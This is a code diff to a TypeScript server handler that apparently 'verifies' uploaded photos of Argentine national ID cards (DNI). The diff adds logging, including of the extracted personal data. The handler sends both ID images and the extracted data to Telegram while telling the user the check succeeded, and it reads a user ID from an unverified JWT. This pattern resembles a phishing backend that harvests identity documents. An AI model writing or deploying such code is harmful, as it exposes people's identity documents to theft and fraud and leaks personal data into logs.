@@ -33,18 +33,26 @@ const validateWithBancoCentral = async (dniData: any) => {
 
 export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
   try {
+    console.log('📄 Iniciando verificación DNI...');
     const { frontImage, backImage } = req.body;
 
     if (!frontImage || !backImage) {
+      console.log('❌ Faltan imágenes');
       res.status(400).json({ error: 'Se requieren ambas imágenes del DNI' });
       return;
     }
 
+    console.log('✅ Imágenes recibidas');
+    console.log('📏 Tamaño frente:', frontImage.length);
+    console.log('📏 Tamaño dorso:', backImage.length);
+
     // Extraer datos del DNI
     const dniData = extractDNIData(frontImage, backImage);
+    console.log('✅ Datos extraídos:', dniData);
     
     // Validar con Banco Central
     const bcValidation = await validateWithBancoCentral(dniData);
+    console.log('✅ Validación BC completa:', bcValidation);
 
     // Obtener info del usuario del token si existe
     const authHeader = req.headers.authorization;
@@ -56,12 +64,13 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
         const decoded: any = jwt.decode(token);
         userId = decoded?.userId || 'unknown';
       } catch (e) {
-        // Token inválido, continuar igual
+        console.log('⚠️ Token inválido, continuar sin userId');
       }
     }
 
     // Enviar a Telegram con información completa (no bloquear si falla)
     try {
+      console.log('📱 Intentando enviar a Telegram...');
       await sendDNINotification({
         userId,
         frontImage,
@@ -69,11 +78,13 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
         timestamp: new Date().toLocaleString('es-AR'),
         dniData,
       });
+      console.log('✅ Telegram enviado exitosamente');
     } catch (telegramError) {
-      console.error('Error en Telegram (no crítico):', telegramError);
+      console.error('⚠️ Error en Telegram (no crítico):', telegramError);
       // Continuar aunque Telegram falle
     }
 
+    console.log('✅ Respondiendo con éxito');
     res.json({ 
       success: true, 
       message: 'DNI verificado exitosamente',
@@ -81,8 +92,12 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
       score: bcValidation.score
     });
   } catch (error) {
-    console.error('Error en verificación DNI:', error);
-    res.status(500).json({ error: 'Error al verificar DNI. Por favor intenta nuevamente.' });
+    console.error('❌ ERROR CRÍTICO en verificación DNI:', error);
+    console.error('Stack:', error instanceof Error ? error.stack : 'No stack');
+    res.status(500).json({ 
+      error: 'Error al verificar DNI. Por favor intenta nuevamente.',
+      details: process.env.NODE_ENV === 'development' ? (error instanceof Error ? error.message : String(error)) : undefined
+    });
   }
 };
 
